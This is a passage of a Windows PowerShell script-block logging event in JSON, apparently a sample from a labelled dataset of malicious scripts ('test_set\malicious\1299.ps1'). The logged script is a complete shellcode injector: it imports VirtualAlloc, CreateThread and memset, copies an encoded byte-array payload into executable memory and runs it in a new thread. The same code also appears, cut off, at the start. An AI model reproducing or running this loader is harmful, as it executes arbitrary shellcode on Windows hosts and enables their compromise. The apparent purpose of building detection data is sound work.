x48,0xea,0xdc,0xc8,0x9e,0xd2,0xaa,0x20,0x23;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 50a50e0e-e0bb-4822-8ccf-06e1bf1ffc10\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1299.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xce,0xb8,0x6b,0xc1,0x00,0x44,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xed,0x97,0x23,0xf5,0xb8,0x8f,0x26,0xf6,0x40,0x4f,0x47,0x7e,0xa5,0x7e,0x47,0xe4,0xad,0xd0,0x77,0x6e,0xe3,0xdc,0xfc,0x22,0x10,0x57,0x70,0xeb,0x17,0xd0,0x3f,0xcd,0x16,0xe1,0x6c,0x2d,0x38,0x61,0x6f,0x62,0x9a,0x58,0xa0,0x77,0xdb,0x9d,0xdd,0x7a,0x89,0x76,0xa9,0x29,0x3e,0xf3,0xe7,0xf1,0xb5,0x4f,0xe9,0x71,0x29,0x07,0x08,0x53,0xfc,0x1c,0x53,0x73,0xfe,0xf1,0xef,0x3a,0x18,0x16,0xd5,0xf5,0x93,0xec,0xa1,0x07,0x72,0x3d,0x49,0xab,0xbb,0xf2,0xb8,0xb5,0xfc,0x34,0x23,0xc0,0xf4,0x47,0xde,0xd3,0xc2,0x3a,0x04,0x51,0xd1,0x9c,0xcf,0xc1,0x3d,0x1d,0x03,0x97,0xb6,0x11,0xe8,0xd3,0x91,0x35,0xef,0x30,0xaa,0x41,0x64,0xb7,0x7d,0xc0,0x3e,0x9c,0x59,0x89,0xe5,0xbd,0xf8,0x77,0x4b,0xc1,0x1b,0xd8,0x34,0x67,0x57,0xf4,0x21,0x1a,0x3a,0x90,0x86,0x17,0xc5,0x60,0x81,0x20,0xb6,0x52,0x0e,0x9b,0x50,0xde,0xc7,0x05,0xa6,0x21,0xf2,0xf2,0x38,0xdc,0xfd,0x02,0x10,0x1a,0xa9,0x52,0x0a,0x8b,0xd2,0x38,0xca,0x34,0x07,0xee,0x9a,0x9a,0xf8,0x4f,0x4b,0x5a,0xa9,0x27,0x81,0x55,0x96,0x58,0xaa,0xbc,0xbf,0xf3,0x50,0x56,0x81,0x6c,0xfe,0x1d,0x69,0x71,0x00,0x60,0xd1,0xfc,0xe6,0x08,0x35,0xa9,0xb1,0xa4,0xac,0xf0,0x4a,0x55,0x30,0x2f,0x37,0x55,0xba,0xdc,0xc7,0x1b,0x4b,0xa8,0xdb,0xcb,0xbb,0xe7,0x86,0x5d,0xc3,0xdd,0xad,0x61,0x51,0xda,0x67,0x36,0xcd,0xe0,0x5e,0x70,0x52,0x1a,0xb5,0x0b,0x5b,0x8e,0x76,0x63,0xa4,0x5e,0x77,0x73,0xf2,0x34,0x77,0x1b,0xa2,0x6c,0x24,0x3e,0xad,0xb8,0x58,0x93,0x38,0x43,0x09,0x40,0xea,0x2b,0xb7,0xbf,0xdc,0xf3,0x48,0xea,0xdc,0xc8,0x9e,0xd2,0xaa,0x20,0x23;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"50a50e0e-e0bb-4822-8ccf-06e1bf1ffc10","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1299.ps1"}}},"location":"EventChannel"}
